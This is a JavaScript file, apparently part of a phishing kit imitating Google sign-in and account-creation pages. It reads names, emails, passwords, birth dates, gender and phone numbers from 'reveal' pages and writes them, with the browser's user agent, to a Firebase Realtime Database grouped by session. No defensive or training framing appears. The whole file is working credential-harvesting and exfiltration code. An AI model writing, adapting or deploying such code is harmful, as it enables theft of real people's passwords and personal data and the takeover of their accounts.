// capture-reveal.js
// Reads the existing reveal page text and pushes a submission to RTDB.
// Include on: reveal.html, reveal-google.html, reveal-google-2.html
//   <script type="module" src="firebase-config.js"></script>
//   <script type="module" src="capture-reveal.js"></script>

import { ref, push, set } from "https://www.gstatic.com/firebasejs/11.0.0/firebase-database.js";

const { db } = window.__FIREBASE__ || {};
if (!db) console.error("Firebase not initialized. Ensure firebase-config.js loads first.");

// Optional: session id via ?session=
const params = new URLSearchParams(window.location.search);
const sessionId = params.get("session") || "default";

// Infer flow from path
const path = (window.location.pathname || "").toLowerCase();
const flow =
  path.includes("google") ? (path.includes("reveal") ? "Google Sign-In" : "Google Flow") :
  path.includes("reveal") ? "Create Account" :
  "Unknown";

// Extract visible text
const text = document.body.innerText || "";
const grab = (label) => {
  const rx = new RegExp(`${label}:\\s*(.*)`, "i");
  const m = text.match(rx);
  return m ? (m[1] || "").trim() : "";
};

const nameOrIdentifier =
  grab("Name") || grab("Email") || grab("Identifier") || "(not provided)";

const passwordOrDobGender = (() => {
  const pw = grab("Password");
  const dob = grab("DOB");
  const gender = grab("Gender");
  const phone = grab("Phone Number");
  if (pw) return `Password: ${pw}`;
  if (dob || gender) return `DOB: ${dob || "(not provided)"} | Gender: ${gender || "(not provided)"}`;
  if (phone) return `Phone: ${phone}`;
  return "(not provided)";
})();

const entry = {
  when: new Date().toISOString(),
  flow,
  identifierOrName: nameOrIdentifier,
  secretOrContext: passwordOrDobGender,
  deviceBrowser: navigator.userAgent,
  page: path
};

const baseRef = ref(db, `sessions/${sessionId}/submissions`);
const childRef = push(baseRef);
set(childRef, entry)
  .then(() => console.debug("Submission recorded:", entry))
  .catch(err => console.error("DB write error:", err));
